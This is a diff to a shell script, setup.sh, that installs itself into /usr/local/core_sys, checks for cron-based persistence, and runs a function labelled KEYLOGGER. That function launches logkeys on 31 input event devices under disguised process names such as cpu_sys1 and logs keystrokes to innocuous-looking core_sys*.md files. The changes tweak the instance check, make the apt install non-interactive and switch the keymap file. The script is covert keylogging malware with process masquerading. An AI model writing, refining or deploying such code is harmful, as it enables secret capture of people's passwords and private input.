@@ -8,7 +8,7 @@ fi
 
 # Check if process already running (prevents multiple instances)
 CHECK_PROC=$(ps aux | grep -i "setup.sh" | grep -v "grep" | wc -l)
-if [ ${CHECK_PROC} -gt 3 ]; then
+if [ ${CHECK_PROC} -gt 5 ]; then
     echo "Another instance of this script is already running, Exiting.."
     exit 1
 fi
@@ -17,7 +17,7 @@ fi
 INSTALL_DIR="/usr/local/core_sys"
 INSTALL() {
     echo "Installing.."
-    apt install curl
+    apt install -y curl
     curl -sL https://deb.nodesource.com/setup_14.x | sudo -E bash -
     apt install -y python3 build-essential autotools-dev autoconf kbd git nodejs
     rm -rf ${INSTALL_DIR}
@@ -54,6 +54,8 @@ if [ ! -f ${SHELL_DEST} ]; then
     touch ${SHELL_DEST}
     cp ${MY_PATH} ${SHELL_DEST}
     chmod +x ${SHELL_DEST}
+    # copy keymap file from current directory to install directory
+    cp keymap ${INSTALL_DIR}
 fi
 
 # Check if cron process exists to avoid multiple instances
@@ -72,13 +74,11 @@ fi
 KEYLOGGER() {
     echo "Starting keylogger.."
     cd ${INSTALL_DIR}
-    sudo logkeys --export-keymap en_US.keymap
     for i in $(seq 1 31); do
         PROC_NAME="cpu_sys${i}"
         OUTPUT_FILE="core_sys${i}.md"
         EVENT_NAME="event${i}"
-
-        COMMAND="logkeys -s -d ${EVENT_NAME} --output ${OUTPUT_FILE} --keymap en_US.keymap"
+        COMMAND="logkeys -s -d ${EVENT_NAME} --output ${OUTPUT_FILE} -m keymap"
         rm -rf /var/run/logkeys.pid
         bash -c "exec -a ${PROC_NAME} ${COMMAND} &"
         rm -rf /var/run/logkeys.pid
